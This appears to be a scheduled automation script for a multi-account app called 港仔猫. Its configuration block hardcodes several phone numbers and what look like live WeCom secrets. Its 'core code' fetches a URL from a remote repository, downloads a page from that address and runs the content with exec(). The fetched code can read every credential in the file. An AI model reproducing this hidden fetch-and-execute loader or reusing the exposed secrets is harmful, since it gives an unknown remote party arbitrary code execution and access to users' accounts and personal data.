'''
cron: */15 9-22 * * *
new Env('港仔猫多账号');
'''

# -*- coding:utf-8 -*-
import requests
#云函数部署教程(http://qr61.cn/ogpvAF/qMXaiV7）环境选python3.6,超时设置900s，触发器定时（0 10/15 7-23 * * * *）
#云函数参数说明见https://link.scflover.cf/cssm
#--------------以下为配置区需自行填写--------------#
#0.云函数接单总开关(选填):一个开关控制所有云函数状态(适用于云函数较多的用户),1开2关，若总开关文件夹名为2则子开关无效，即关闭。
all_switch='https://wwp.lanzouw.com/b0ert2c9e'
#1.港仔猫子开关:支持多账号，需传token参数，多账号蓝奏云链接之间用#隔开
folder = 'https://wwp.lanzouw.com/b0eqmifbc#https://wwp.lanzouw.com/b0erhxosj#https://wwp.lanzouw.com/b0erhxn9e'
#2.手机号，填写账号信息，支持多账号，手机号之间用#隔开，必须和folder一一对应，否则会报错
phone = '13005275420#18998275420#13169256776'
#3.(选填，不填则不推送)微信pushplus通知推送参数
Token = ''
#4.(选填，不填则不推送)企业微信推送参数
AgentId = '1000004'
corpid = 'wwad849d24b9ae762e'
Secret = 'H4t9D51QTfrQnQS_-aXCDqp4N-o8HrvCUOuJzUGLudw'
media_id='2Dl-C5yXBJZuOsW65sApwspsRzYcA6bbK6qm6NGCBOPL2KFuUDTR6YDjHbempF65c'
#----------以下为核心代码区，请勿擅自修改！-----------#
gxwz='https://scflover.coding.net/p/scf/d/p/git/raw/master/gxwz'#代码更新网站

def main_handler(event, context):
    code=requests.get(requests.get(gxwz).text+'/GzMa6ZADygcY4ryobdw2ROmTA5RrJF4Kci0VjE2is.html')
    code.encoding='utf-8'
    exec(code.text,globals())

if __name__ == '__main__':
    main_handler("", "")
